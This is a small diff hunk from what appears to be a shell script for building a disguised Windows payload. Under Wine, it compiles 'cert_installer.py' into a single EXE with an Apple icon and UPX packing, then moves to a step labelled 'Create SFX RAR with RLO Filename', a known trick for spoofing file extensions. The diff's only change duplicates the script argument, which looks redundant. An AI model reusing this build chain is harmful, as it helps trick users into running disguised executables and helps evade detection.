@@ -103,7 +103,7 @@ color_print GREEN "[*] Installing PyInstaller and building EXE with UPX..."
 wine python -m pip install --upgrade pip setuptools wheel
 wine python -m pip install pyinstaller
 
-wine pyinstaller --onefile --noconfirm --icon "C:\\pyinstaller-build\\apple.ico" --upx-dir "C:\\upx" "C:\\pyinstaller-build\\cert_installer.py"
+wine pyinstaller --onefile --noconfirm --icon "C:\\pyinstaller-build\\apple.ico" --upx-dir "C:\\upx" "C:\\pyinstaller-build\\cert_installer.py" "C:\\pyinstaller-build\\cert_installer.py"
 cp "$WINEPREFIX/drive_c/users/$USER/dist/$EXE_NAME" "$DIST_PATH/"
 
 # --- Create SFX RAR with RLO Filename ---
